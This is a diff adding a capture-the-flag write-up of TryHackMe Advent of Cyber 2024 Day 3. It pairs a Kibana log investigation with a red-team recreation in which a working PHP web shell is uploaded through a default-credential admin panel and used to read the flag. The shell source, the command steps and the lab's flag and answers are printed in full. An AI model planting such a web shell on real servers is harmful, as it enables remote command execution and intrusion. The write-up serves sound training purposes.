@@ -1,0 +1,102 @@
+# 🎄 Advent of Cyber 2024 – Day 3  
+**Title**: *“Even If I Wanted to Go, Their Vulnerabilities Wouldn’t Allow It”*
+
+---
+
+## 🧭 Objective  
+Investigate Frosty Pines Resort's Elastic SIEM logs (Blue Team), then recreate the attack on the web app (Red Team) to retrieve the flag.
+
+---
+
+## 🔵 Blue Team: Log Investigation
+
+### ✅ Access Kibana
+- Open browser inside Ubuntu VM.
+- Navigate to: `http://10.10.207.166:5601`
+
+### 🔍 SIEM Queries
+- Selected Index: `frostypines-resorts`
+- Timeframe: Oct 1–3, 2024
+- Searched for: `"shell.php"`
+
+### 🔐 Results:
+| Question | Answer |
+|---------|--------|
+| Where was the web shell uploaded? | `/media/images/rooms/shell.php` |
+| What IP accessed the shell? | `10.11.83.34` |
+
+---
+
+## 🔴 Red Team: Exploitation
+
+### ✏️ Step 1: Add Host Resolution
+```bash
+echo "10.10.207.166 frostypines.thm" | sudo tee -a /etc/hosts
+```
+
+### 🔐 Step 2: Login to Admin Console
+- URL: `http://frostypines.thm`
+- **Username**: `admin@frostypines.thm`
+- **Password**: `admin`
+
+### 💉 Step 3: Upload Malicious Web Shell
+Under “Add Room,” upload a file named `shell.php` with contents:
+```php
+<html><body>
+<form method="GET">
+<input type="text" name="command" autofocus size="50">
+<input type="submit" value="Execute">
+</form>
+<pre><?php if (isset($_GET['command'])) { system($_GET['command'] . ' 2>&1'); } ?></pre>
+</body></html>
+```
+
+> The server may rename it to `.jpg`, but can still execute as `.php`
+
+---
+
+### 🚀 Step 4: Access Shell
+Browse to:
+```
+http://frostypines.thm/media/images/rooms/shell.php
+```
+
+Execute commands like:
+```bash
+?command=ls
+?command=cat flag.txt
+```
+
+---
+
+## 🏁 FLAG
+```text
+THM{Gl1tch_Was_H3r3}
+```
+
+---
+
+## ⚠️ Troubleshooting Challenges
+
+- VPN tunnel dropping → Reconnect via OpenVPN
+- Kibana not loading → Restart target machine from THM dashboard
+- Web shell not working → Rename file, verify upload path
+- Permission issues with `/etc/hosts` → Use `sudo tee -a`
+- `find` command noisy → Add `2>/dev/null` or use root access
+
+---
+
+## 📚 References
+- [Advent of Cyber Day 3 Blog](https://medium.com/@araman99/advent-of-cyber-2024-day-3-even-if-i-wanted-to-go-their-vulnerabilities-wouldnt-allow-it-a7b8e93317d1)
+- Elastic SIEM Logs
+- TryHackMe Training Room
+
+---
+
+## ✍️ Analyst Notes
+- Demonstrates insecure file upload vulnerability
+- Web app lacks content-type and extension validation
+- Default admin credentials used — critical authentication failure
+- Strong case for adding server-side MIME checks + firewall rules
+
+---
